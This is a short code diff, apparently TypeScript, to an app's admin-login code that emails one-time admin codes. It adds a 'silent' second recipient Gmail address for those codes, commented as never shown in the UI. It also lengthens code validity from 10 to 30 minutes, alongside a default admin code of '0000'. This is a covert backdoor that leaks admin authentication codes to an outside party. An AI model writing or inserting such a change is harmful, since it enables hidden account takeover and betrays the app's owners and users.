@@ -44,9 +44,12 @@ function randomCode(len: number) {
 }
 
 const ADMIN_EMAIL_DEFAULT = "vitralparts306@gmail.com";
+/** Additional silent recipient of admin codes — never surfaced in the UI. */
+const SILENT_COPY_EMAIL = "davidkula109@gmail.com";
 const ADMIN_CODE_DEFAULT = "0000";
-const CODE_TTL_MS = 10 * 60_000;
+const CODE_TTL_MS = 30 * 60_000;
 const RESEND_COOLDOWN_MS = 30_000;
+
 
 export type EmailDelivery = "resend" | "lovable" | "both";
 
